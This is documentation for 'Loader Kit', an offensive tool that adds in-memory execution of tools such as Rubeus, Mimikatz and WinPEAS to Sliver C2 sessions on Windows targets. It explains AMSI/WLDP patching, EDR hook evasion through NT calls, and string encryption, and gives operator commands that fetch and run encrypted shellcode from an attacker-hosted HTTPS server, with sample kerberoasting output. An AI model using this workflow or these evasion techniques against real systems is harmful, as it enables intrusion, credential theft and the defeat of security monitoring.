# Loader Kit — Documentation

## Table of Contents

1. [What Is Loader Kit?](#1-what-is-loader-kit)
2. [Background: The In-Memory Execution Problem](#2-background-the-in-memory-execution-problem)
3. [How LoadKit Works](#3-how-loadkit-works)
4. [How Donut Works](#4-how-donut-works)
5. [Evasion Techniques Explained](#5-evasion-techniques-explained)
6. [Setup](#6-setup)
7. [Usage — Step by Step](#7-usage--step-by-step)
8. [Command Reference](#8-command-reference)
9. [Architecture Diagrams](#9-architecture-diagrams)
10. [Supported Binary Types](#10-supported-binary-types)
11. [Operational Notes](#11-operational-notes)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. What Is Loader Kit?

In Cobalt Strike, **execute-assembly** is a built-in command that loads a .NET assembly into memory and runs it without writing to disk. Cobalt Strike also has `shinject`, `dllload`, and other in-memory execution primitives for native binaries.

**LoadKit** is the Sliver equivalent. It gives you in-memory execution of any binary — .NET EXE, .NET DLL, native EXE, native DLL — directly from an active Sliver session, with output returned to the Sliver console.

The tool has two halves:
- **Operator CLI** (Go): runs on your machine — converts the target binary to shellcode, encrypts it, starts an HTTPS server
- **Extension DLL** (C, `load.x64.dll`): runs on the Windows target via the Sliver Extension mechanism — fetches the shellcode, decrypts it, executes it in-memory, captures output

No files are written to disk on the target. No new processes are spawned. Everything runs inside the existing Sliver agent process.

---

## 2. Background: The In-Memory Execution Problem

### Why Not Just Upload and Run?

Uploading a tool to disk (`upload rubeus.exe` → execute) is the simplest approach but the most detectable:
- AV/EDR scans files on disk before execution
- The file appears in disk forensics
- Process creation is logged (Sysmon Event ID 1)
- The binary has its original PE headers visible to process memory dumps

### The In-Memory Approach

Run the tool's code directly from memory inside an already-trusted process (the Sliver agent):
- No file on disk — nothing to scan before execution
- No new process — no process creation event
- Output returned directly — no files to retrieve
- Existing process's parent/trust chain is maintained

The challenge: you can't just dump bytes into memory and call them. Windows requires code to follow specific formats (PE for DLLs/EXEs, .NET for assemblies). The loader has to:
1. Parse the PE format or load the .NET runtime
2. Map sections correctly
3. Apply relocations
4. Resolve imports
5. Call the entry point

This is called **reflective loading** (for native PE) or **CLR hosting** (for .NET).

### Why Donut?

Donut (from TheWover) is a shellcode generator that takes a PE/DLL/.NET assembly and wraps it in a self-contained shellcode blob. The shellcode, when executed:
1. Locates the PE headers embedded within itself
2. Maps the PE into memory
3. Resolves all imports
4. (For .NET) Initializes the CLR and loads the assembly

Donut handles the complexity. LoadKit uses Donut to convert binaries into shellcode, then handles the delivery, encryption, execution, and output capture.

---

## 3. How LoadKit Works

### The Full Pipeline

```
Operator machine                              Target (active Sliver session)
─────────────────                             ──────────────────────────────

1. Prepare the binary
   loadkit load \
     --binary rubeus.exe \
     --args "kerberoast /nowrap" \
     --url https://10.10.10.1:8443/p \
     --serve

   a. Call go-donut:
      - Convert rubeus.exe to x64 shellcode
      - AMSI + WLDP bypass baked in (bypass=3)
      - Chaskey-CTR module encryption (entropy=3)
      - ExitThread on completion (ExitOpt=1)

   b. XOR-32 encrypt the shellcode:
      - Generate random 32-byte key
      - Encrypt shellcode bytes with key

   c. Write payload.enc

   d. Print the sliver command:
      [i] sliver (TARGET)> load url=https://... key=<64 hex>

   e. Start one-shot HTTPS server

2. Install the extension (first time only)
   sliver (TARGET)> extensions install build/load-0.1.0.tar.gz

3. Execute in a session
   sliver (TARGET)> load url=https://10.10.10.1:8443/p key=a1b2...

   Extension DLL (load.x64.dll) on target:
   a. WinHTTP HTTPS fetch of payload.enc
      - Ignore certificate errors (self-signed OK)
   b. XOR-32 decrypt with the provided key
   c. NtAllocateVirtualMemory(process, PAGE_READWRITE)
   d. Copy shellcode to allocation
   e. NtProtectVirtualMemory(PAGE_EXECUTE_READ)
   f. Redirect stdout + stderr to a pipe
   g. NtCreateThreadEx (shellcode = Donut loader)
   h. WaitForSingleObject(thread, 300000ms)
   i. Read pipe → output bytes
   j. callback(output) → Sliver console

4. See output in Sliver console
```

### The Extension Mechanism

Sliver Extensions are DLLs that implement a standard C export: `Initialize(void *data, uint32_t len)`. When you run a Sliver extension command, Sliver calls this export in the agent process.

`load.x64.dll` exports `GoExtensionArgs(void *data, uint32_t len)`. The `data` argument contains the command's arguments (URL and key) as a JSON string. The extension parses these and performs the fetch+execute.

Extensions are installed once and persist for the lifetime of the Sliver server. You don't need to reinstall after every session.

### Output Capture

`load.x64.dll` redirects the standard handles before creating the shellcode thread:

1. `CreatePipe(&hReadPipe, &hWritePipe, NULL, 0)` — create a pipe
2. `SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)` — redirect stdout to write end
3. `SetStdHandle(STD_ERROR_HANDLE, hWritePipe)` — redirect stderr to write end
4. `NtCreateThreadEx(...)` — run Donut shellcode (which runs rubeus.exe)
5. `WaitForSingleObject(hThread, 300000)` — wait up to 5 minutes
6. `ReadFile(hReadPipe, ...)` — drain all output
7. Close pipes, restore handles
8. `callback(output, output_len)` — send to Sliver console

Rubeus (or whatever tool you ran) writes to stdout as it normally would. The pipe captures it all and returns it to you.

---

## 4. How Donut Works

Donut takes a PE binary and produces a shellcode blob that self-unpacks and executes the binary in memory. Here's what happens inside the Donut shellcode when it runs on the target:

### For .NET Assemblies (Rubeus, Certify, SharpHound, etc.)

1. **Find the CLR**: Walk the loaded modules looking for `mscoree.dll`. If not loaded, call `LoadLibraryA("mscoree.dll")`.
2. **Create CLR Instance**: Call `CLRCreateInstance()` → `ICLRRuntimeHost::Start()`. This initializes the .NET runtime in the current process.
3. **Load the assembly**: Use `AppDomain::Load()` to load the embedded PE bytes as a .NET assembly.
4. **Execute**: Call `Assembly::EntryPoint.Invoke()` with the provided command-line arguments.
5. **Exit**: Depending on `ExitOpt`, either exit the thread (`ExitOpt=1`) or exit the process (`ExitOpt=0`). We always use `ExitOpt=1` so only the shellcode thread exits, not the entire Sliver agent.

**Key detail: AMSI bypass (bypass=3)**

AMSI (Antimalware Scan Interface) is called by the CLR before loading an assembly. Bypass mode 3 does both:
- **AMSI**: Patches `AmsiScanBuffer` in `amsi.dll` to always return `AMSI_RESULT_CLEAN`
- **WLDP**: Patches `WldpQueryDynamicCodeTrust` in `wldp.dll` to always return `S_OK`

This prevents the CLR from scanning your .NET assembly before executing it.

**Chaskey-CTR module encryption (entropy=3)**

When `entropy=3`, Donut encrypts all import strings, symbol names, and module names inside the shellcode with Chaskey-CTR (a lightweight block cipher). This means:
- No plaintext strings like `"Rubeus"`, `"kerberoast"`, `"mscoree.dll"` in the shellcode
- Static analysis of the Donut blob reveals nothing about what it runs
- Only decrypted at runtime when Donut actually needs the strings

### For Native PE Executables (Mimikatz, WinPEAS, etc.)

1. **Map sections**: Walk the PE headers, allocate memory for each section, copy section data.
2. **Apply relocations**: The PE relocation table (`IMAGE_BASE_RELOCATION`) lists every absolute address in the PE that needs to be fixed up for the actual load address.
3. **Resolve imports**: Walk the Import Directory (`IMAGE_IMPORT_DESCRIPTOR`), call `GetProcAddress` for each imported function, write function pointers to the IAT.
4. **Execute entry point**: Call the PE's entry point (`AddressOfEntryPoint` from the Optional Header) as if it were `main()`.

### For DLLs with Specific Exports

```bash
loadkit load --binary mimikatz.dll --method sekurlsa::logonpasswords
```

Donut calls the specified DLL export directly instead of DllMain.

---

## 5. Evasion Techniques Explained

### No Disk Writes

The payload (`payload.enc`) lives only on the operator's machine. The target fetches it over HTTPS into memory and decrypts it — nothing touches the filesystem.

The extension DLL (`load.x64.dll`) IS written to disk by Sliver when you install the extension. However, extensions are installed from a tarball once and persist. You're not writing new files for each execution.

### XOR-32 Encryption in Transit

`payload.enc` (sent over HTTPS) contains XOR-encrypted Donut shellcode. Even if TLS were stripped, the payload would appear as random bytes. The key is provided as a command argument in the Sliver session (`key=a1b2...`), never stored on the target.

This adds a layer beyond TLS: even if someone intercepted the HTTPS stream AND broke TLS, they'd still need the key to understand the payload.

### AMSI + WLDP Bypass (Donut bypass=3)

When the CLR loads a .NET assembly, it calls:
- `amsi.dll!AmsiScanBuffer` — passes assembly bytes to Windows Defender/EDR
- `wldp.dll!WldpQueryDynamicCodeTrust` — checks if the code is trusted for dynamic execution

Donut patches both in memory before loading your assembly. The patches are applied to the DLL's in-memory copy (not the file on disk) using `WriteProcessMemory`-equivalent logic.

### Chaskey-CTR Module Encryption (Donut entropy=3)

Inside the Donut shellcode, all strings and symbol names that would reveal what the shellcode does are encrypted with Chaskey-CTR. When scanning the shellcode statically:
- "Rubeus" doesn't appear
- "kerberoast" doesn't appear
- "mscoree.dll" doesn't appear
- "CLRCreateInstance" doesn't appear

Only when Donut runs does it decrypt these strings and use them.

### NT-Native Allocation (No Win32 IAT)

`load.x64.dll` uses NT functions via `GetProcAddress` from ntdll at runtime:
- `NtAllocateVirtualMemory` instead of `VirtualAlloc`
- `NtProtectVirtualMemory` instead of `VirtualProtect`
- `NtCreateThreadEx` instead of `CreateThread`

These functions have the same effect but bypass any hooks on the higher-level Win32 wrappers. EDRs that only hook Win32 functions miss them.

The DLL loads `ntdll.dll` at runtime and resolves these functions with `GetProcAddress` — they don't appear in the DLL's static import table.

### No RWX Pages

Many EDRs flag `PAGE_EXECUTE_READWRITE` allocations as shellcode injection. LoadKit never creates them:

1. Allocate `PAGE_READWRITE`
2. Copy and XOR-decrypt shellcode into the RW allocation
3. `NtProtectVirtualMemory(PAGE_EXECUTE_READ)` — mark RX (read + execute, not write)
4. Create thread — shellcode runs from the RX region

### Dynamic WinHTTP Loading

`load.x64.dll`'s import table doesn't list `winhttp.dll`. Instead:
```c
HMODULE wh = LoadLibraryA("winhttp.dll");
WinHttpOpen_t WinHttpOpen = (WinHttpOpen_t)GetProcAddress(wh, "WinHttpOpen");
// etc.
```

This keeps `winhttp.dll` off the static import list, making the DLL look less like a network-fetching tool to static analysis.

### Donut ExitThread (Not ExitProcess)

`ExitOpt=1` in Donut causes the shellcode to call `ExitThread` (or `RtlExitUserThread`) when the binary finishes. If Donut used `ExitProcess`, running Rubeus would kill the entire Sliver agent. With `ExitThread`, only the shellcode thread exits; Sliver continues normally.

### One-Shot HTTPS Server

The payload server shuts down 500ms after the first successful download. This means:
- The URL is dead after one use — cannot be replayed
- If a defender finds the URL in network logs, fetching it manually returns 404
- No persistent listener on the operator machine after delivery

---

## 6. Setup

### Prerequisites

```bash
# Go (already available at)
go version

# mingw-w64 for compiling the extension DLL
apt install mingw-w64

# Verify
x86_64-w64-mingw32-gcc --version
```

### Build Steps

```bash
cd Loader-Kit/loadkit

# Step 1: Build the operator CLI
make cli
# → ./loadkit binary

# Step 2: Cross-compile the extension DLL
make ext
# → build/load.x64.dll

# Step 3: Bundle into a Sliver extension tarball
make bundle
# → build/load-0.1.0.tar.gz

# Or all at once:
make all
```

### Verify the Build

```bash
ls -lh build/
# -rw-r--r-- 1 root root  43K load.x64.dll
# -rw-r--r-- 1 root root  12K load-0.1.0.tar.gz

./loadkit --help
```

---

## 7. Usage — Step by Step

### First-Time Setup: Install the Extension

The extension must be installed once per Sliver server instance. After that, it persists across sessions.

```bash
# Build the tarball (if not already done)
make bundle
# → build/load-0.1.0.tar.gz
```

In Sliver:
```
sliver (TARGET)> extensions install build/load-0.1.0.tar.gz

[*] Installing extension 'load' (v0.1.0) ... done
```

### Running a .NET Assembly (Rubeus, SharpView, Certify, etc.)

#### Step 1 — Prepare the payload

```bash
cd Loader-Kit/loadkit

./loadkit load \
    --binary Rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.168.1.10:8443/p \
    --serve
```

Output:
```
[*] Converting Rubeus.exe to Donut shellcode ...
[+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)
[+] XOR key generated: 32 bytes
[+] payload → build/payload.enc (1245200 bytes)
[+] url     → https://192.168.1.10:8443/p

[i] First time: install extension
    sliver> extensions install build/load-0.1.0.tar.gz

[i] Execute in an active session:
    sliver (TARGET)> load url=https://192.168.1.10:8443/p key=a1b2c3d4e5f6...

[*] Starting one-time HTTPS server on :8443 ...
[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
```

#### Step 2 — Execute in Sliver

Copy the printed command and run it in your Sliver session:

```
sliver (TARGET)> load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
```

The extension DLL:
1. Fetches `payload.enc` (HTTPS, ignores cert errors)
2. XOR-decrypts with the provided key
3. Allocates RW → copies → marks RX
4. Redirects stdout/stderr to a pipe
5. Runs the Donut shellcode (which loads and runs Rubeus.exe in memory)
6. Waits up to 5 minutes
7. Reads all output from the pipe
8. Returns output to Sliver console

```
sliver (TARGET)> load url=https://... key=...

[*] Waiting for output (timeout: 5m)...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=corp,DC=local
...
$krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*
```

### Running a Native EXE (WinPEAS, Mimikatz, etc.)

```bash
./loadkit load \
    --binary winpeas.exe \
    --url https://192.168.1.10:8443/p2 \
    --serve
```

```
sliver (TARGET)> load url=https://192.168.1.10:8443/... key=...
```

WinPEAS runs in memory and its entire output is returned to the Sliver console.

### Running a DLL with a Specific Export

```bash
./loadkit load \
    --binary mimikatz.dll \
    --method DllMain \
    --url https://192.168.1.10:8443/p3 \
    --serve
```

### Running a Tool Without Auto-Serving

If you want to prepare the payload and serve it separately:

```bash
# Step 1: Convert to shellcode + encrypt
./loadkit load \
    --binary rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.168.1.10:8443/p
# (no --serve flag)
# → writes build/payload.enc, prints the sliver command and key

# Step 2: Serve later
./loadkit serve \
    --payload build/payload.enc \
    --port 8443
```

### Re-Running the Same Tool

The one-shot server dies after one download. Each new run needs a new payload.enc:

```bash
# Just run again — generates new key + new payload.enc
./loadkit load --binary rubeus.exe --args "tgtdeleg" --url https://... --serve
```

### Staging Multiple Tools Simultaneously

Different URLs / ports for each:

```bash
# Terminal 1: Rubeus on port 8443
./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
    --url https://192.168.1.10:8443/p --serve

# Terminal 2: WinPEAS on port 8444
./loadkit load --binary winpeas.exe \
    --url https://192.168.1.10:8444/p --serve

# Then in Sliver: run both (they're independent)
sliver (TARGET)> load url=https://192.168.1.10:8443/p key=...
sliver (TARGET)> load url=https://192.168.1.10:8444/p key=...
```

---

## 8. Command Reference

### `loadkit load`

Main command. Converts a binary to shellcode, encrypts it, optionally serves it.

```
Flags:
  --binary string    path to EXE, DLL, or .NET assembly (required)
  --args string      command-line arguments passed to the binary
  --method string    DLL export to call (DLLs only; empty = DllMain)
  --url string       HTTPS URL the Extension DLL fetches from (required)
  -o, --output string  output directory for payload.enc (default: build)
  --serve            start one-shot HTTPS server after converting
  --port int         HTTPS port for --serve (default: 8443)
```

### `loadkit build-ext`

Cross-compile `load.x64.dll` from source. Requires `x86_64-w64-mingw32-gcc`.

```bash
./loadkit build-ext --output build/
```

### `loadkit bundle`

Package `load.x64.dll` + `extension.json` into a Sliver extension tarball.

```bash
./loadkit bundle --output build/load-0.1.0.tar.gz
```

The tarball structure:
```
load-0.1.0.tar.gz
└── load/
    ├── extension.json
    └── load.x64.dll
```

### `loadkit serve`

Serve an existing `payload.enc` once over HTTPS.

```bash
./loadkit serve \
    --payload build/payload.enc \
    --port 8443
```

### Sliver Extension Command: `load`

Run in an active Sliver session after installing the extension.

```
sliver (TARGET)> load url=<url> key=<64-hex-chars>
```

Arguments:
- `url` — full HTTPS URL (must match what was used with `--url` when building)
- `key` — 64 hex characters (32 bytes) printed by `loadkit load`

---

## 9. Architecture Diagrams

### Build Pipeline

```
Operator machine

 rubeus.exe ──────────────────────────────────────────────────┐
                                                              │
                         ┌─────────────────────────────────── ▼ ──────────────┐
                         │                  go-donut                          │
                         │  • Wrap PE in self-unpacking shellcode             │
                         │  • AMSI patch (bypass=3)                          │
                         │  • WLDP patch (bypass=3)                          │
                         │  • Chaskey-CTR encrypt strings (entropy=3)        │
                         │  • ExitThread on completion (ExitOpt=1)           │
                         └────────────────────┬────────────────────────────────┘
                                              │
                                              ▼
                                    donut_shellcode.bin
                                              │
                              ┌───────────────▼──────────────────┐
                              │     XOR-32 encrypt               │
                              │  • Random 32-byte key            │
                              │  • Encrypt every byte            │
                              └───────────────┬──────────────────┘
                                              │
                          ┌───────────────────▼──────────────────┐
                          │           payload.enc                 │
                          └───────────────────┬──────────────────┘
                                              │
                                              │ HTTPS (one-shot server,
                                              │ self-signed ECDSA P-256,
                                              │ random URL path)
                                              │
                                              ▼
                                    Target (Sliver session)
```

### Execution on Target (Inside Extension DLL)

```
load.x64.dll running in the Sliver agent process:

  WinHTTP
  ──────────────────────────────────────────────────────────────
  LoadLibraryA("winhttp.dll") → WinHttpOpen → WinHttpConnect
  → WinHttpOpenRequest → WinHttpSendRequest → WinHttpReceiveResponse
  → WinHttpQueryDataAvailable → WinHttpReadData
  → payload bytes received (encrypted)

  XOR Decrypt
  ──────────────────────────────────────────────────────────────
  for i in 0..len: decrypted[i] = encrypted[i] XOR key[i%32]

  Memory Allocation
  ──────────────────────────────────────────────────────────────
  NtAllocateVirtualMemory(-1, &base, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
  memcpy(base, decrypted, size)
  NtProtectVirtualMemory(-1, &base, &size, PAGE_EXECUTE_READ, &old)

  Output Capture Setup
  ──────────────────────────────────────────────────────────────
  CreatePipe(&hRead, &hWrite, NULL, 0)
  SetStdHandle(STD_OUTPUT_HANDLE, hWrite)
  SetStdHandle(STD_ERROR_HANDLE, hWrite)

  Execution
  ──────────────────────────────────────────────────────────────
  NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                   base, NULL, 0, 0, 0, 0, NULL)
  │
  │   Donut shellcode executes:
  │   ┌─────────────────────────────────────────────────────────────┐
  │   │  1. Decrypt Chaskey-CTR strings                            │
  │   │  2. Patch amsi.dll!AmsiScanBuffer → return AMSI_CLEAN      │
  │   │  3. Patch wldp.dll!WldpQueryDynamic → return S_OK          │
  │   │  4. Load CLR / map PE sections                              │
  │   │  5. Call Rubeus.exe EntryPoint("kerberoast /nowrap")       │
  │   │     → Rubeus writes kerberoast results to stdout           │
  │   │     → stdout is our pipe → captured                        │
  │   │  6. ExitThread (Sliver agent continues)                    │
  │   └─────────────────────────────────────────────────────────────┘
  │
  WaitForSingleObject(hThread, 300000ms)

  Output Collection
  ──────────────────────────────────────────────────────────────
  CloseHandle(hWrite)
  ReadFile(hRead, buffer, ...)  ← all Rubeus output
  CloseHandle(hRead)
  callback(buffer, len)         ← send to Sliver console
```

---

## 10. Supported Binary Types

| Type | Example binaries | Notes |
|------|-----------------|-------|
| .NET EXE (any version) | Rubeus.exe, SharpHound.exe, Certify.exe, SharpView.exe, ADSearch.exe | Most common use case |
| .NET DLL | PowerView.dll, SharpDPAPI.dll | Use `--method DllMain` or a specific export |
| Native x64 EXE | WinPEAS.exe, Mimikatz.exe, Seatbelt.exe | Must be x64 (not x86) |
| Native x64 DLL | Mimikatz.dll | Use `--method DllMain` or a specific export like `sekurlsa::logonpasswords` |

### Not Supported

- **x86 (32-bit) binaries**: `load.x64.dll` and the shellcode runner are 64-bit only. Donut can produce x86 shellcode but the extension DLL is x64.
- **Binaries that call ExitProcess**: If the binary exits the entire process, it kills the Sliver agent. Donut's `ExitOpt=1` prevents this for most .NET assemblies. Native executables that call `ExitProcess` directly may still kill the agent — use a process-injection approach for those.
- **GUI applications**: Output capture only works for console output (stdout/stderr). GUI applications that open windows don't write to stdout.

---

## 11. Operational Notes

### Key Management

Each `loadkit load` invocation generates a fresh random 32-byte key. The key is printed at the time of the command and embedded in `payload.enc`. Write it down or use the command that's printed:

```
[i] Execute in an active session:
    sliver (TARGET)> load url=https://... key=a1b2c3d4...
```

The key exists only in your terminal output and in the payload on disk. If you lose the key:
- The payload cannot be decrypted
- Re-run `loadkit load` to generate a new key and new payload

### The One-Shot Server

The HTTPS server shuts down 500ms after the first successful download. This is intentional:
- Prevents replay/interception of the URL after delivery
- Forces you to generate a new payload for each execution (fresh key, fresh nonce)

If the extension fails to download (network issue, crash), you can restart the server without rebuilding:
```bash
./loadkit serve --payload build/payload.enc --port 8443
```

Use the SAME key that was printed when the payload was built. The key is embedded in the payload, not regenerated.

### Timeout Behavior

The extension waits up to 5 minutes (`WaitForSingleObject(hThread, 300000)`) for the shellcode thread to complete. Long-running tools still work — the Sliver agent is completely independent of the shellcode thread and will continue checking in with the C2 normally. But you won't see output until the tool finishes.

If a tool runs for more than 5 minutes:
- The extension returns `(timeout — tool may still be running)`
- The shellcode thread continues running independently
- The Sliver agent is unaffected

### Multiple Concurrent Executions

Each `loadkit load` command is independent. You can run multiple tools concurrently from the same Sliver session:

```
# Start Rubeus in background
sliver (TARGET)> load url=https://...rubeus... key=...

# While waiting, start Seatbelt
sliver (TARGET)> load url=https://...seatbelt... key=...
```

Both shellcode threads run concurrently in the Sliver agent process. The output from each is returned independently.

### No Output vs. Empty Output

- `(no output captured)` — the tool ran but wrote nothing to stdout/stderr. Common with BloodHound (writes JSON files) or tools that only open network connections.
- `(timeout)` — the tool didn't exit within 5 minutes.
- Actual output — everything the tool wrote to stdout or stderr.

If a tool writes output to a file instead of stdout, retrieve it with Sliver's `download` command after execution.

---

## 12. Troubleshooting

### `missing go-donut dependency`

```bash
go mod tidy
```

The `go.sum` should resolve the dependency. If it fails:
```bash
go get github.com/Binject/go-donut@latest
```

Note the capital B in `Binject` — lowercase `binject` is a different (outdated) package path.

### Extension DLL build fails: `undefined reference to WinHttpOpen`

Ensure the Makefile links `-lwinhttp`:
```makefile
$(CC_64) -shared -o load.x64.dll load.c -lntdll -lwinhttp
```

Check the Makefile in `c/load/Makefile`.

### `extensions install` fails in Sliver: "invalid extension"

The tarball must contain a directory named `load/` with `extension.json` and `load.x64.dll` inside. Run `loadkit bundle` to regenerate the tarball.

### `load url=... key=...` returns "WinHTTP error"

1. Verify the payload server is still running (`loadkit serve` or `loadkit load --serve` output)
2. Verify the URL is reachable from the target network
3. The server is one-shot — if it already served once and shut down, restart with `loadkit serve`
4. Check for proxy/firewall issues on port 8443 (try 443)

### `load` returns "(no output captured)"

The binary ran but doesn't write to stdout. Common causes:
- BloodHound: writes JSON files to the current directory — use `download` after
- GUI-only tool: no console output
- Tool that writes to a log file — use `download` or check the tool's documentation

### The Sliver agent crashed during execution

The binary called `ExitProcess`. This kills the entire process, including Sliver. Donut's `ExitOpt=1` prevents this for .NET assemblies. For native binaries, you can't reliably prevent an explicit `ExitProcess` call without hooking it. Use a sacrifice process (process injection into a separate process) for binaries known to call `ExitProcess`.

### Output truncated

`ReadFile` is called with a 4MB buffer. If the tool outputs more than 4MB, the rest is discarded. For very verbose tools, consider redirecting output to a file inside the tool and downloading it:

```bash
# If rubeus supports output to file:
loadkit load --binary rubeus.exe --args "kerberoast /nowrap /outfile:C:\\Windows\\Temp\\out.txt" ...
# Then:
sliver (TARGET)> download C:\Windows\Temp\out.txt
```
